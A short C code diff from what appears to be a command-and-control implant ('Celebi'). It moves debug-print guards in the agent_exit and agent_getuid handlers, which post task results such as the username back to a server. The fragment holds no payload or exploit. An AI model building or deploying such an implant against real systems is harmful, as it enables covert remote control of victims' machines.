@@ -34,7 +34,7 @@ void agent_exit(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 		TaskPostReply reply = { 0 };
 		perform_post(state, task, &reply, "", "success");
 		
-		#ifdef CELEBI_EXIT_THREAD
+		#ifdef CELEBI_DEBUG
 		if (reply.success == 1) {
 			dprintf("Server acknowledged exit.");
 		}
@@ -58,7 +58,7 @@ void agent_getuid(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	TaskPostReply reply = { 0 };
 	perform_post(state, task, &reply, username, "success"); // TODO check if username is null and perform post based on that
 	
-	#ifdef CELEBI_EXIT_THREAD
+	#ifdef CELEBI_DEBUG
 	if (reply.success == 1) {
 		dprintf("Server acknowledged getuid output.");
 	}
